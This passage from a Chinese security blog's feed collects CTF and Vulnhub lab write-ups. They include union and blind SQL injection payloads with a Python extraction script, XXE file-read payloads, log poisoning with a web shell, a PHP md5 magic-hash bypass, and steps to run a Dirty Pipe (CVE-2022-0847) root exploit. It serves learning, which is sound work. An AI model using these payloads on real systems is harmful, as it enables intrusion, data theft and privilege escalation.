src="/posts/a805ee79/image-20220315223049696.png" alt="image-20220315223049696"></p><p>访问110.php</p><p><img src="/posts/a805ee79/image-20220315223113606.png" alt="image-20220315223113606"></p><p>拿到flag</p><h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><p><img src="/posts/a805ee79/image-20220315223607588.png" alt="image-20220315223607588"></p><p>右键查看源代码</p><p><img src="/posts/a805ee79/image-20220315223646712.png" alt="image-20220315223646712"></p><p>发现账号密码</p><p>hackbar使用post提交</p><p><img src="/posts/a805ee79/image-20220315224036124.png" alt="image-20220315224036124"></p><p><img src="/posts/a805ee79/image-20220315224042961.png" alt="image-20220315224042961"></p><p>拿到flag</p><h2 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h2><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>访问&#x2F;db&#x2F;db.mdb</p><p>下载数据库备份文件</p><p>使用easyaccess打开搜索flag</p><p><img src="/posts/a805ee79/image-20220315225015240.png" alt="image-20220315225015240"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0847 Linux内核提权漏洞复现</title>
    <link href="/posts/77a28503/"/>
    <url>/posts/77a28503/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-0847Linux内核提权漏洞复现"><a href="#CVE-2022-0847Linux内核提权漏洞复现" class="headerlink" title="CVE-2022-0847Linux内核提权漏洞复现"></a>CVE-2022-0847Linux内核提权漏洞复现</h1><blockquote><p>漏洞影响版本：5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102</p><p>POC:<a href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></p></blockquote><blockquote><p>漏洞原理：<a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com</a></p></blockquote><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Linux RedTeam 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU&#x2F;Linux</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit: A root exploit for CVE-2022-0847 (Dirty Pipe) (github.com)</a></p><p>使用方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./compile.sh<br>./exploit  <br></code></pre></td></tr></table></figure><p>执行成功后root密码变为aaron使用命令su输入密码即可进入root命令行</p><p>部分执行完成后直接进入shell</p><p><img src="/posts/77a28503/yDazi35C1ZqLEXF-16590095805203.png" alt="yDazi35C1ZqLEXF"></p><p>恢复密码命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv /tmp/passwd.bak /etc/passwd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub XXE靶机渗透记录</title>
    <link href="/posts/8c5d5e49/"/>
    <url>/posts/8c5d5e49/</url>
    
    <content type="html"><![CDATA[<h1 id="Vulnhub-XXE靶场复现"><a href="#Vulnhub-XXE靶场复现" class="headerlink" title="Vulnhub-XXE靶场复现"></a>Vulnhub-XXE靶场复现</h1><p>靶场地址：<a href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p><p><strong>1、nmap扫描主机</strong></p><p>靶机没有密码只有扫描</p><p><img src="/posts/8c5d5e49/image-20220307224327734.png" alt="image-20220307224327734"></p><p>扫到一个开放80端口的主机 打开浏览器看下</p><p><img src="/posts/8c5d5e49/image-20220307224411581.png" alt="image-20220307224411581"></p><p>好像并没有什么</p><p>使用目录扫描工具扫下</p><p><img src="/posts/8c5d5e49/image-20220307224832118.png" alt="image-20220307224832118"></p><p>看到robots.txt爬虫文件打卡看下</p><p><img src="/posts/8c5d5e49/image-20220307224904223.png" alt="image-20220307224904223"></p><p>发现一个xxe目录</p><p>进去看下</p><p><img src="/posts/8c5d5e49/image-20220307224931306.png" alt="image-20220307224931306"></p><p>是个登录框</p><p>使用弱口令抓包试下</p><p><strong>2、发现xxe漏洞</strong></p><p><img src="/posts/8c5d5e49/image-20220307225204537.png" alt="image-20220307225204537"></p><p>xml格式</p><p>使用读文件payload试下能不能读passwd文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE r [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT r <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>成功</p><p>接下来针对admin.php看下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE r [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT r <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/8c5d5e49/image-20220307230938074.png" alt="image-20220307230938074"></p><p>发现一段base64加密</p><p><img src="/posts/8c5d5e49/image-20220307231024452.png" alt="image-20220307231024452"></p><p><img src="/posts/8c5d5e49/image-20220307231122838.png" alt="image-20220307231122838"></p><p>发现md5加密的密码</p><p><img src="/posts/8c5d5e49/image-20220307231152070.png" alt="image-20220307231152070"></p><p>登录看看</p><p>注意admin.php是在xxe目录下 因为我们刚才在使用读文件协议实在xxe目录下</p><p><img src="/posts/8c5d5e49/image-20220307231609573.png" alt="image-20220307231609573"></p><p><img src="/posts/8c5d5e49/image-20220307231615415.png" alt="image-20220307231615415"></p><p>什么都没有</p><p>使用读文件协议读下flagmeout.php</p><p><img src="/posts/8c5d5e49/image-20220307231824201.png" alt="image-20220307231824201"></p><p>base64解码</p><p><img src="/posts/8c5d5e49/image-20220307231858595.png" alt="image-20220307231858595"></p><p>得到一串不熟悉的编码。</p><p>好吧，这是base32</p><p><img src="/posts/8c5d5e49/image-20220307232016835.png" alt="image-20220307232016835"></p><p>又是个base64</p><p><img src="/posts/8c5d5e49/image-20220307232058821.png" alt="image-20220307232058821"></p><p>继续读&#x2F;etc&#x2F;.flag.php</p><p><img src="/posts/8c5d5e49/image-20220307232311983.png" alt="image-20220307232311983"></p><p>继续解码</p><p><img src="/posts/8c5d5e49/image-20220307232342978.png" alt="image-20220307232342978"></p><p>看到$_联想到了php去php运行下</p><p><img src="/posts/8c5d5e49/image-20220307232628649.png" alt="image-20220307232628649"></p><p>搞定收工</p><p>整体来说就是各种XXEpaylod 和 编码</p>]]></content>
    
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow_web刷题记录[持续更新......]</title>
    <link href="/posts/fa386b67/"/>
    <url>/posts/fa386b67/</url>
    
    <content type="html"><![CDATA[<h1 id="Web刷题记录"><a href="#Web刷题记录" class="headerlink" title="Web刷题记录"></a>Web刷题记录</h1><h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p><img src="/posts/fa386b67/image-20220306204413736-165900174270427.png" alt="image-20220306204413736"></p><p>F12查看源码</p><p><img src="/posts/fa386b67/image-20220306204451163.png" alt="image-20220306204451163"></p><p>base64解码</p><p><img src="/posts/fa386b67/image-20220306204535846.png" alt="image-20220306204535846"></p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/posts/fa386b67/image-20220306210147379.png" alt="image-20220306210147379"></p><p>一个登录框</p><p>尝试弱口令，，，，失败</p><p>使用万能密码</p><p><img src="/posts/fa386b67/image-20220306210303069.png" alt="image-20220306210303069"></p><p>成功登录 接下来进行sql注入</p><p><img src="/posts/fa386b67/image-20220306210557871.png" alt="image-20220306210557871"></p><p><img src="/posts/fa386b67/image-20220306210547490.png" alt="image-20220306210547490"></p><p>有3个字段 接下来看回显</p><p><img src="/posts/fa386b67/image-20220306210641695.png" alt="image-20220306210641695"></p><p>2处有回显 改为注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查看数据库<br>username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;or 1=1 union select 1,database(),3#&amp;password=1</span><br><span class="hljs-string">#查看表</span><br><span class="hljs-string">username=admin&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()#<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220306211250740.png" alt="image-20220306211250740"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查看flag表中的数据<br>username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;or 1=1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#&amp;password=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">#查看flag</span><br><span class="hljs-string">username=admin&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> flag#<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220306211624887.png" alt="image-20220306211624887"></p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>这题主要考察php的伪协议</p><p>详情可见<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><p>这里使用php:&#x2F;&#x2F;input协议</p><p>使用phpinfo测试</p><p><img src="/posts/fa386b67/image-20220306221021594.png" alt="image-20220306221021594"></p><p><img src="/posts/fa386b67/image-20220306221052212.png" alt="image-20220306221052212"></p><p>接下来使用执行系统指令查看当前目录的文件夹</p><p><img src="/posts/fa386b67/image-20220306221503246.png" alt="image-20220306221503246"></p><p><img src="/posts/fa386b67/image-20220306221452532.png" alt="image-20220306221452532"></p><p>查看ctf_go_go_go文件</p><p><img src="/posts/fa386b67/y76O4rWLDawEQkf.png" alt="image-20220306221738302"></p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p><img src="/posts/fa386b67/xO9wgrz37jAsacW.png" alt="image-20220307192056465"></p><p>请求头看到是nginx搭建</p><p>查看nginx日志</p><p>?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p><img src="/posts/fa386b67/XENCDzcxQMIJBYe.png" alt="image-20220307190214602"></p><p>发现日志文件尝试在日志中插入一句话木马</p><p>先抓个包</p><p><img src="/posts/fa386b67/UvjlyFfXSzPW9hE.png" alt="image-20220307212115102"></p><p>添加一句话木马</p><p>蚁剑连接</p><p><img src="/posts/fa386b67/2b1WhsZmnOJviBo-165900179393549.png" alt="image-20220307212247404"></p><p><img src="/posts/fa386b67/image-20220307212323762-165900180009251.png" alt="image-20220307212323762"></p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;       <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ctype_alpha()函数:如果参数为字符串字母则返回Ture否则Flase</p><p>is_numeric()函数:如果参数为数字和数字字符串则返回Ture否则Flase浮点型返回1，即 TRUE。</p><p>也就是v1为字母 v2为数字</p><p>这里主要利用php md5碰撞</p><p>md5碰撞介绍：<br>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><p>详情<a href="https://blog.csdn.net/anzhuangguai/article/details/70049960">https://blog.csdn.net/anzhuangguai/article/details/70049960</a></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?v1<span class="hljs-operator">=</span>QNKCDZO<span class="hljs-operator">&amp;</span>v2<span class="hljs-operator">=</span><span class="hljs-number">240610708</span><br></code></pre></td></tr></table></figure><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><img src="/posts/fa386b67/yBGzlZCi91at7dI-165900180559753.png" alt="image-20220308163456072"></p><p>一个登录框</p><p>首先试下万能密码</p><p><img src="/posts/fa386b67/XwL9IrkHMRs4mVo-165900180799355.png" alt="image-20220308163528102"></p><p>抓包看下</p><p><img src="/posts/fa386b67/QmMS7b2436LWpeV-165900181035357.png" alt="image-20220308164012827"></p><p>发现空格被过滤了</p><p>使用&#x2F;**&#x2F;代替空格</p><p><img src="/posts/fa386b67/QCr5n3YBJRK4UiE-165900181265759.png" alt="image-20220308164039336"></p><p>登录成功 接下来猜字段</p><p><img src="/posts/fa386b67/jE2Js8S9QbZqTrU.png" alt="image-20220308164922763"></p><p>3个字段 继续使用union 查看回显</p><p><img src="/posts/fa386b67/bMl86JAiyUjoQ2I.png" alt="image-20220308165004852"></p><p>2处为回显</p><p>接下来进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查看数据库<br>username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/yiXDlJ8wbvjensg-165900182072165.png" alt="image-20220308165558090"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查表<br>username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema<span class="hljs-operator">=</span>database()<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/9zPsoXm173dNgGw-165900182504967.png" alt="image-20220308165542589"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查字段<br>username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/mnWQfT94YyG1N83-165900182771769.png" alt="image-20220308165841243"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查数据<br>username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>D1<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p>随便点一个</p><p><img src="/posts/fa386b67/MNYT1oehSVHamZv.png" alt="image-20220309233612766"></p><p>看url应该是sql注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/34opSrgjQGvZdKw-165900183166571.png" alt="image-20220309233721194"></p><p>抓包看下</p><p>应该是空格被过滤了</p><p>用&#x2F;**&#x2F;试下</p><p><img src="/posts/fa386b67/ekz96oF8faOEXBr-165900183700675.png" alt="image-20220309234057695"></p><p>正常了</p><p>看回显</p><p><img src="/posts/fa386b67/aEdQO9VhzUipkKr-165900184015977.png" alt="image-20220309234458637"></p><p>2，3</p><p>根据前面的题盲猜应该还是flag表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag<span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/kSiKWDsMnBgLT5u-165900184312779.png" alt="image-20220309234528344"></p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>和上一关一样存在sql注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220310225247255.png" alt="image-20220310225247255"></p><p>使用union看回显</p><p><img src="/posts/fa386b67/image-20220310225316125.png" alt="image-20220310225316125"></p><p>报错了</p><p>应该是过滤了union或者select</p><p>这里使用盲注</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>s=requests.session()<br>url=<span class="hljs-string">&#x27;http://273325e5-2d7d-49b3-ab29-95181b40a737.challenge.ctf.show/index.php&#x27;</span><br>table=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">45</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,<span class="hljs-number">128</span>):<br>        <span class="hljs-comment">#爆表名  flag</span><br>        <span class="hljs-comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br>        <span class="hljs-comment">#爆字段名 flag</span><br>        <span class="hljs-comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br>        <span class="hljs-comment">#读取flag</span><br>        payload = <span class="hljs-string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="hljs-built_in">str</span>(i), <span class="hljs-built_in">str</span>(j))<br><br>        ra = s.get(url=url + <span class="hljs-string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;I asked nothing&#x27;</span> <span class="hljs-keyword">in</span> ra:<br>            table += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(table)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>flag:</p><p><img src="/posts/fa386b67/image-20220310232534339.png" alt="image-20220310232534339"></p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p><img src="/posts/fa386b67/image-20220311212421282.png" alt="image-20220311212421282"></p><p>打开就是一个登录界面，只有账号没有密码</p><p>本以为是sql注入，但试了很多payload都没有回显</p><p>使用目录扫描工具扫下</p><p>发现robots.txt</p><p><img src="/posts/fa386b67/image-20220311213312985.png" alt="image-20220311213312985"></p><p>看下是什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)&gt;<span class="hljs-number">10</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;password error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span 